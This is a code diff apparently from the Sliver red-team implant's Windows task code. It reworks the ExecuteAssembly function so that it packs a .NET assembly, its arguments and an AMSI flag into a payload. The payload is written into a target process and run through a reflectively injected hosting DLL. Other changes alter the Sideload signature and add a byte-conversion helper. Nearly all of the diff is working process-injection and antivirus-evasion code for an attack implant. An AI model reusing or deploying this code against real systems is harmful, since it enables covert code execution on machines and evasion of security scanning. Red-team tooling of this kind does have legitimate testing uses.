@@ -28,20 +28,20 @@ import (
 	"log"
 	// {{else}}{{end}}
 	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 	"unsafe"
-	"runtime"
 
-	"golang.org/x/sys/windows"
-	"github.com/bishopfox/sliver/sliver/version"
-	"github.com/bishopfox/sliver/sliver/syscalls"
 	"github.com/bishopfox/sliver/sliver/evasion"
+	"github.com/bishopfox/sliver/sliver/syscalls"
+	"github.com/bishopfox/sliver/sliver/version"
+	"golang.org/x/sys/windows"
 	"syscall"
 )
 
 const (
-	BobLoaderOffset     = 0x00000af0
+	BobLoaderOffset     = 0x00000d30 //0x00000af0
 	PROCESS_ALL_ACCESS  = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
 	MAX_ASSEMBLY_LENGTH = 1025024
 	STILL_ACTIVE        = 259
@@ -50,7 +50,7 @@ const (
 var (
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
-	CurrentToken windows.Token
+	CurrentToken    windows.Token
 )
 
 func sysAlloc(size int, rwxPages bool) (uintptr, error) {
@@ -183,7 +183,9 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
+func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool) (string, error) {
+	assemblySizeArr := convertIntToByteArr(len(assembly))
+	paramsSizeArr := convertIntToByteArr(len(params))
 	err := refresh()
 	if err != nil {
 		return "", err
@@ -220,19 +222,33 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
 	// {{end}}
 	// Total size to allocate = assembly size + 1024 bytes for the args
-	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
+	totalSize := uint32(len(assembly) + 1024)
 	// Padd arguments with 0x00 -- there must be a cleaner way to do that
-	paramsBytes := []byte(params)
-	padding := make([]byte, 1024-len(params))
-	final := append(paramsBytes, padding...)
-	// Final payload: params + assembly
-	final = append(final, assembly...)
-	assemblyAddr, err := allocAndWrite(final, handle, totalSize)
+	// paramsBytes := []byte(params)
+	// padding := make([]byte, 1024-len(params))
+	// final := append(paramsBytes, padding...)
+	// // Final payload: params + assembly
+	// final = append(final, assembly...)
+
+	// 4 bytes Assembly Size
+	// 4 bytes Params Size
+	// 1 byte AMSI bool  0x00 no  0x01 yes
+	// parameter bytes
+	// assembly bytes
+	payload := append(assemblySizeArr, paramsSizeArr...)
+	if amsi {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
+	}
+	payload = append(payload, []byte(params)...)
+	payload = append(payload, assembly...)
+	assemblyAddr, err := allocAndWrite(payload, handle, totalSize)
 	if err != nil {
 		return "", err
 	}
 	// {{if .Debug}}
-	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
+	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// {{end}}
 	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr+BobLoaderOffset), assemblyAddr, uint32(len(hostingDll)))
 	if err != nil {
@@ -303,7 +319,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 }
 
 //SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte) (string, error) {
+func Sideload(procName string, data []byte, args string) (string, error) {
 	return SpawnDll(procName, data, 0, "")
 }
 
@@ -368,7 +384,7 @@ func waitForCompletion(threadHandle windows.Handle) error {
 		} else {
 			break
 		}
-	} 
+	}
 	return nil
 }
 
@@ -405,5 +421,18 @@ func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr ui
 	if err != nil {
 		return
 	}
+	return
+}
+
+func convertIntToByteArr(num int) (arr []byte) {
+	// This does the same thing as the union used in the DLL to convert intValue to byte array and back
+	arr = append(arr, byte(num%256))
+	v := num / 256
+	arr = append(arr, byte(v%256))
+	v = v / 256
+	arr = append(arr, byte(v%256))
+	v = v / 256
+	arr = append(arr, byte(v))
+
 	return
 }
